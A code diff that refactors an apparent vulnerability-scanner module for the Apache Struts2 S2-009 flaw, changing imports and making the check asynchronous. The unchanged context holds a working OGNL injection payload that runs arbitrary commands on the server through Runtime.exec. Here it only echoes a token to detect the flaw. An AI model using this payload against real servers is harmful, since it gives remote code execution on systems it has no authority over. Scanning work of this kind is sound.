@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.encode import urlencode
-from app.lib.utils.common import get_capta, filter_str, get_useragent
+from app.lib.request import request
+from app.lib.encode import urlencode
+from app.lib.common import get_capta, filter_str, get_useragent
 
 class S2_009_BaseVerify:
     def __init__(self, url):
@@ -24,7 +24,7 @@ class S2_009_BaseVerify:
         }
         self.payload =  '?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27{cmd}%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'
 
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -36,16 +36,13 @@ class S2_009_BaseVerify:
 
         try:
             check_url = self.url + self.payload.format(cmd = urlencode('echo' + ' ' + self.capta))
-            check_res = request.get(check_url, headers = self.headers)
-            check_str = filter_str(list(check_res.text))
-            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
+            check_res = await request.get(check_url, headers = self.headers)
+            check_str = filter_str(list(await check_res.text()))
+            if check_res.status == 200 and len(check_str) < 100 and self.capta in check_str:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
